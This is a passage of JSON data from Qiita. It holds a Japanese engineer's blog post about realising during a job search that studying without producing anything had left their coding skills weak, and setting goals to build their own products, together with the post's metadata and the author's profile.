自社開発、受託開発、開発ができるSESなどの企業にひたすらエントリー、いざ面接！<br>\n⇒あれ…？私技術レベル低くない？コーディングテストボロボロやん…<br>\n　ポートフォリオって何…？Githubで自分の作ったものコミット…？<br>\n⇒私も個人開発挑戦してみよう、アイデア考えた！いざ開発！<br>\n⇒何から手をつければわからない、コード書けない…</p>\n<h2 data-sourcepos=\"29:2-29:10\">\n<span id=\"目標\" class=\"fragment\"></span><a href=\"#%E7%9B%AE%E6%A8%99\"><i class=\"fa fa-link\"></i></a>目標</h2>\n<p data-sourcepos=\"30:2-30:96\">　短期：自分が作りたいと思ったプロダクトを0→1で作れるようになる</p>\n<p data-sourcepos=\"32:1-33:106\">　中期：スキルがないからこの仕事ができない、諦めないと…って考えがなくなるくらいのスキルを持つ<br>\n　このプロジェクトやりたいです！って自身を持って言えるエンジニアになる</p>\n<p data-sourcepos=\"35:1-36:80\">　長期：自分と同じように成長したいと思っていても、上手くいかないと悩んだり、苦しんだりしている人が一人でも少なくなるような存在になる<br>\n　LT会やカンファレンスを見る人ではなく発信する人になる</p>\n","body":"## 現状の自分\n#### 仕事内容\nSES企業に入社して4年\n金融系の保守\n　設計書～ソースの修正\n 　たまに新規機能追加で設計書作成、新規実装\n\n#### スキル\n　フロントエンド：HTML・CSS・javascript 読める\n　バックエンド：Javaが読める・ちょっとした機能追加の実装ができる\n　SQL：CRUD読める、書ける\n\n## 勉強はしていたつもり\n#### 今までやってきたこと\n　毎月3冊は技術書を購入して読む\n　Udemyで興味のある動画をまとめ買い、隙間時間に視聴\n　Qiitaの投稿チェック\n　LeatCodeやpaizaの問題を解く\n\n## きっかけ\n　転職活動を機にアウトプットが大切であると気づいたことがきっかけです。（今さらですが…）\n　自社開発、受託開発、開発ができるSESなどの企業にひたすらエントリー、いざ面接！\n ⇒あれ…？私技術レベル低くない？コーディングテストボロボロやん…\n 　ポートフォリオって何…？Githubで自分の作ったものコミット…？\n ⇒私も個人開発挑戦してみよう、アイデア考えた！いざ開発！\n ⇒何から手をつければわからない、コード書けない…\n \n \n ## 目標\n 　短期：自分が作りたいと思ったプロダクトを0→1で作れるようになる\n  \n　中期：スキルがないからこの仕事ができない、諦めないと…って考えがなくなるくらいのスキルを持つ\n 　このプロジェクトやりたいです！って自身を持って言えるエンジニアになる\n    \n　長期：自分と同じように成長したいと思っていても、上手くいかないと悩んだり、苦しんだりしている人が一人でも少なくなるような存在になる\n　LT会やカンファレンスを見る人ではなく発信する人になる\n","coediting":false,"comments_count":0,"created_at":"2025-02-01T20:55:20+09:00","group":null,"id":"3494f8dbb9b81e2ab032","likes_count":8,"private":false,"reactions_count":0,"stocks_count":4,"tags":[{"name":"勉強","versions":[]},{"name":"エンジニア","versions":[]}],"title":"勉強してきた（つもりだった）エンジニア、アウトプットの大切さに気づく","updated_at":"2025-02-01T20:57:12+09:00","url":"https://qiita.com/asa129/items/3494f8dbb9b81e2ab032","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":4664,"team_membership":null,"organization_url_name":"jisou","slide":false}]